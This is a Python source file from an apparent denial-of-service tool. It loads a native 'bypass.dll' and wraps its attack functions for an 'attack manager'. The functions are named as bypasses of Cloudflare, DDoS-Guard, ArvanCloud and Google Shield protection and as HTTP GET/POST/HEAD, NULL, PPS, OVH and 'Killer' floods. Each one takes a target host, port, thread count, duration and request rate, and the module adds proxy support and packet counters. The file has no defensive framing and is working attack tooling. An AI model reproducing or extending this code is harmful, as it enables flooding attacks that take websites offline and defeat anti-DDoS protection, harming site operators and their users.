"""Go bypass.dll loader and thin wrapper.

Loads ``bin/bypass.dll`` at import time (silent no-op if the DLL is absent).
Exposes ``GO_BYPASS_AVAILABLE``, ``GO_BYPASS_METHODS``, and
``GoBypassInstance`` for use by the attack manager.
"""

import ctypes
import os
from pathlib import Path

# Locate the project root (two levels up from this file: engine/ → laitoxx/ → gui/)
_PROJECT_ROOT = str(Path(__file__).resolve().parents[2])

# ── Global DLL handle ─────────────────────────────────────────────────────
_dll: "ctypes.CDLL | None" = None
GO_BYPASS_AVAILABLE = False


def _load() -> bool:
    global _dll, GO_BYPASS_AVAILABLE

    if GO_BYPASS_AVAILABLE:
        return True

    dll_path = os.path.join(_PROJECT_ROOT, "bin", "bypass.dll")
    if not os.path.exists(dll_path):
        return False

    try:
        lib = ctypes.CDLL(dll_path)

        c_str  = ctypes.c_char_p
        c_int  = ctypes.c_int
        c_int64 = ctypes.c_int64

        attack_fns = (
            "CFBypass", "CFUAMBypass", "DDosGuardBypass", "ArvanBypass",
            "GoogleBotFlood", "GoogleShieldBypass", "CombinedBypass", "KillerFlood",
            "HTTPGetFlood", "HTTPPostFlood", "HTTPHeadFlood", "NULLFlood",
            "PPSFlood", "EVENFlood", "RHEXFlood", "DYNFlood", "COOKIEFlood", "OVHFlood",
        )
        for name in attack_fns:
            fn = getattr(lib, name)
            fn.argtypes = [c_str, c_str, c_str, c_str, c_int, c_int, c_int]
            fn.restype  = None

        lib.InitBypass.argtypes = [c_str];      lib.InitBypass.restype = None
        lib.SetProxy.argtypes   = [c_str] * 4;  lib.SetProxy.restype   = None
        lib.ClearProxy.argtypes = [];            lib.ClearProxy.restype = None
        lib.StopMethod.argtypes = [c_str];       lib.StopMethod.restype = None
        lib.StopAll.argtypes    = [];            lib.StopAll.restype    = None
        lib.GetPackets.argtypes = [c_str];       lib.GetPackets.restype = c_int64
        lib.IsRunning.argtypes  = [c_str];       lib.IsRunning.restype  = c_int

        ua_path = os.path.join(_PROJECT_ROOT, "headers", "ua.txt")
        lib.InitBypass(ua_path.encode())

        _dll = lib
        GO_BYPASS_AVAILABLE = True
        return True

    except Exception:
        return False


_load()

# Method codes routed through the Go engine
GO_BYPASS_METHODS: frozenset[str] = frozenset({
    # Bypass methods
    "CFB", "CFBUAM", "DGB", "AVB", "BOT", "GSB", "BYPASS", "KILLER",
    # L7 HTTP Basic (Go provides TLS that C++ lacks)
    "GET", "POST", "HEAD", "NULL", "PPS", "EVEN", "RHEX", "DYN", "COOKIE", "OVH",
})

# backend_code → Go function name
_GO_FN: dict[str, str] = {
    "CFB":    "CFBypass",
    "CFBUAM": "CFUAMBypass",
    "DGB":    "DDosGuardBypass",
    "AVB":    "ArvanBypass",
    "BOT":    "GoogleBotFlood",
    "GSB":    "GoogleShieldBypass",
    "BYPASS": "CombinedBypass",
    "KILLER": "KillerFlood",
    "GET":    "HTTPGetFlood",
    "POST":   "HTTPPostFlood",
    "HEAD":   "HTTPHeadFlood",
    "NULL":   "NULLFlood",
    "PPS":    "PPSFlood",
    "EVEN":   "EVENFlood",
    "RHEX":   "RHEXFlood",
    "DYN":    "DYNFlood",
    "COOKIE": "COOKIEFlood",
    "OVH":    "OVHFlood",
}


def fn_name_for(code: str) -> str:
    """Return the Go DLL function name for *code*, or raise ``KeyError``."""
    return _GO_FN[code]


def set_proxy(kind: str, addr: str, user: str = "", password: str = "") -> None:
    if GO_BYPASS_AVAILABLE:
        _dll.SetProxy(kind.encode(), addr.encode(), user.encode(), password.encode())


def clear_proxy() -> None:
    if GO_BYPASS_AVAILABLE:
        _dll.ClearProxy()


# ── Per-attack wrapper ────────────────────────────────────────────────────

class GoBypassInstance:
    """Thin wrapper around bypass.dll that mirrors the C++ AttackInstance API."""

    def __init__(self, job_id: str, fn_name: str,
                 scheme: str, host: str, port: int,
                 threads: int, duration: int, rps: int) -> None:
        self._id       = job_id
        self._fn_name  = fn_name
        self._scheme   = scheme
        self._host     = host
        self._port     = str(port)
        self._threads  = threads
        self._duration = duration
        self._rps      = rps
        self._started  = False

    def start(self) -> None:
        if not GO_BYPASS_AVAILABLE:
            return
        fn = getattr(_dll, self._fn_name)
        fn(
            self._id.encode(),
            self._scheme.encode(),
            self._host.encode(),
            self._port.encode(),
            ctypes.c_int(self._threads),
            ctypes.c_int(self._duration),
            ctypes.c_int(self._rps),
        )
        self._started = True

    def stop(self) -> None:
        if GO_BYPASS_AVAILABLE and self._started:
            _dll.StopMethod(self._id.encode())

    def get_packets_sent(self) -> int:
        if not (GO_BYPASS_AVAILABLE and self._started):
            return 0
        return int(_dll.GetPackets(self._id.encode()))

    def is_running(self) -> bool:
        if not (GO_BYPASS_AVAILABLE and self._started):
            return False
        return bool(_dll.IsRunning(self._id.encode()))
